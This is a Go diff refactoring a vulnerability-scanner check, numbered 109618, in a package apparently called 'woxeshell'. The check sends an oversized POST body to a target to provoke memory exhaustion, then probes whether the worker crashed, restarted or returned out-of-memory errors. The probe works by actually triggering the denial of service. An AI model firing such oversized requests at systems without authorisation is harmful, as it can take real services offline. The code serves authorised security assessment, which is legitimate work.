@@ -2,7 +2,7 @@ package scanner
 
 import (
 	"context"
-	"io"
+	"fmt"
 	"net/http"
 	"strings"
 	"time"
@@ -10,89 +10,123 @@ import (
 	"woxeshell/internal/payload"
 )
 
-func (s *Scanner) check109618(ctx context.Context, c *http.Client, target string) (bool, []string) {
+func (s *Scanner) check109618(ctx context.Context, target string) (bool, []string) {
 	var ev []string
 
-	baseReq, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader("<?php echo 'ok'; ?>"))
+	baseResp, err := s.postSmall(ctx, target)
 	if err != nil {
-		return false, nil
+		return false, append(ev, "109618: baseline request failed: "+err.Error())
 	}
-	s.applyHeaders(baseReq)
-	baseReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	baseStatus := baseResp.StatusCode
+	baseServer := baseResp.Header.Get("Server")
+	readAndClose(baseResp, 8192, 8192)
 
-	baseResp, err := s.doWithRetry(ctx, c, baseReq)
+	ctrl1Resp, err := s.postSmall(ctx, target)
 	if err != nil {
-		return false, nil
+		return false, append(ev, "109618: control request failed before probe: "+err.Error())
 	}
-	io.Copy(io.Discard, baseResp.Body)
-	baseResp.Body.Close()
-	if baseResp.StatusCode >= 500 {
-		return false, nil
-	}
-	baselineServer := baseResp.Header.Get("Server")
+	ctrl1Server := ctrl1Resp.Header.Get("Server")
+	readAndClose(ctrl1Resp, 8192, 8192)
 
-	const probeSize = 32 * 1024 * 1024
-	big := payload.OOMProbePayload(probeSize)
-	bigReq, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(string(big)))
+	size := s.opts.ProbeSizeBytes
+	bigReq, err := http.NewRequestWithContext(ctx, "POST",
+		addQueryParam(target, "cb", payload.RandomHex(6)),
+		payload.NewPatternReader(size))
 	if err != nil {
-		return false, nil
+		return false, ev
 	}
 	s.applyHeaders(bigReq)
 	bigReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	bigReq.ContentLength = size 
 
-	bigResp, err := s.doWithRetry(ctx, c, bigReq)
+	bigResp, err := s.client.Do(bigReq)
 	if err != nil {
-		if isConnReset(err) {
-			ev = append(ev, "109618: connection reset after oversized request")
-			return true, ev
+		if isCtxErr(err) {
+
+			return false, ev
 		}
-		return false, nil
+		ev = append(ev, fmt.Sprintf("109618: connection error during oversized request: %v", err))
+		return s.confirmUnresponsive(ctx, target, ev)
 	}
-	bigBody, _ := io.ReadAll(io.LimitReader(bigResp.Body, 16384))
-	bigResp.Body.Close()
+	bigBody := readAndClose(bigResp, 16<<10, 1<<20)
 
-	time.Sleep(300 * time.Millisecond)
-
-	postReq, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader("<?php echo 'ok'; ?>"))
-	if err != nil {
-		return false, nil
-	}
-	s.applyHeaders(postReq)
-	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	postResp, err := s.doWithRetry(ctx, c, postReq)
-	if err != nil {
-		ev = append(ev, "109618: worker unresponsive after oversized request")
-		return true, ev
-	}
-	defer postResp.Body.Close()
-
-	if srv := postResp.Header.Get("Server"); srv != "" && baselineServer != "" && srv != baselineServer {
-		ev = append(ev, "109618: Server header changed after oversized request")
-		return true, ev
-	}
-
-	if bigResp.StatusCode >= 500 {
-		low := strings.ToLower(string(bigBody))
-		for _, sig := range []string{"fatal", "memory", "allocate", "out of memory", "oom"} {
+	switch sc := bigResp.StatusCode; {
+	case sc == http.StatusRequestEntityTooLarge || sc == http.StatusBadRequest:
+		ev = append(ev, fmt.Sprintf("109618: server rejected oversized body with HTTP %d; probe not delivered", sc))
+		return false, ev
+	case sc >= 500:
+		low := strings.ToLower(bigBody)
+		for _, sig := range []string{"fatal", "memory", "allocate", "out of memory", "oom", "exhausted"} {
 			if strings.Contains(low, sig) {
-				ev = append(ev, "109618: server returned 5xx with fatal/OOM signature after oversized request")
+				ev = append(ev, "109618: 5xx response with memory/OOM signature after oversized request")
 				return true, ev
 			}
 		}
+		ev = append(ev, fmt.Sprintf("109618: server returned HTTP %d after oversized request", sc))
 	}
+
+	time.Sleep(s.opts.Settle)
+
+	ctrl2Server := ""
+	var ctrl2Err error
+	for attempt := 0; attempt < 2; attempt++ {
+		resp, err := s.postSmall(ctx, target)
+		if err == nil {
+			ctrl2Server = resp.Header.Get("Server")
+			readAndClose(resp, 8192, 8192)
+			ctrl2Err = nil
+			break
+		}
+		ctrl2Err = err
+		if isCtxErr(err) {
+			return false, ev
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	if ctrl2Err != nil {
+		ev = append(ev,
+			fmt.Sprintf("109618: worker unresponsive after oversized request (baseline was HTTP %d)", baseStatus))
+		return true, ev
+	}
+
+	if baseServer != "" && ctrl1Server == baseServer && ctrl2Server != "" && ctrl2Server != baseServer {
+		ev = append(ev,
+			fmt.Sprintf("109618: Server header changed after oversized request (%q -> %q); worker restart suspected",
+				baseServer, ctrl2Server))
+		return true, ev
+	}
+
 	return false, ev
 }
 
-func isConnReset(err error) bool {
-	if err == nil {
-		return false
-	}
-	s := err.Error()
-	for _, sig := range []string{"connection reset", "broken pipe", "unexpected EOF", "EOF"} {
-		if strings.Contains(s, sig) {
-			return true
+
+func (s *Scanner) confirmUnresponsive(ctx context.Context, target string, ev []string) (bool, []string) {
+	time.Sleep(s.opts.Settle)
+	for attempt := 0; attempt < 2; attempt++ {
+		resp, err := s.postSmall(ctx, target)
+		if err == nil {
+			readAndClose(resp, 8192, 8192)
+			ev = append(ev,
+				"109618: server recovered right after the oversized request; body-size rejection, not an OOM indicator")
+			return false, ev
 		}
+		if isCtxErr(err) {
+			return false, ev
+		}
+		time.Sleep(500 * time.Millisecond)
 	}
-	return false
+	ev = append(ev, "109618: worker unresponsive after oversized request (control requests failed twice)")
+	return true, ev
+}
+
+func (s *Scanner) postSmall(ctx context.Context, target string) (*http.Response, error) {
+	req, err := http.NewRequestWithContext(ctx, "POST",
+		addQueryParam(target, "cb", payload.RandomHex(6)),
+		strings.NewReader("<?php echo 'ok'; ?>"))
+	if err != nil {
+		return nil, err
+	}
+	s.applyHeaders(req)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	return s.doWithRetry(ctx, req)
 }
